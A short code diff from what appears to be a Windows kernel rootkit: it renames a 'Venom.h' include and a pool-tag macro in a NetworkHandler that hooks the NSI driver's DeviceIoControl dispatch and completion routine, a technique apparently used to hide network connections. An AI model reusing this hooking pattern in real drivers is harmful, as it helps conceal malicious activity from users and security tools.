@@ -1,5 +1,5 @@
 #include "NetworkHandler.h"
-#include "Venom.h"
+#include "Config.h"
 
 PDRIVER_OBJECT NetworkHandler::pNsiDriverObject = nullptr;
 PDRIVER_DISPATCH NetworkHandler::originalNsiDeviceIo = nullptr;
@@ -57,7 +57,7 @@ NTSTATUS NetworkHandler::hookedDeviceIoControl(
 		if (irpStack->Parameters.DeviceIoControl.InputBufferLength == sizeof(NSI_PARAM))
 		{
 			//If call is relevent, hook the CompletionRoutine.
-			PHP_CONTEXT ctx = static_cast<HP_CONTEXT*>(ExAllocatePoolWithTag(NonPagedPool, sizeof(HP_CONTEXT), DRIVER_TAG));
+			PHP_CONTEXT ctx = static_cast<HP_CONTEXT*>(ExAllocatePoolWithTag(NonPagedPool, sizeof(HP_CONTEXT), POOL_TAG));
 			if (ctx == nullptr)
 			{
 				status = STATUS_INSUFFICIENT_RESOURCES;
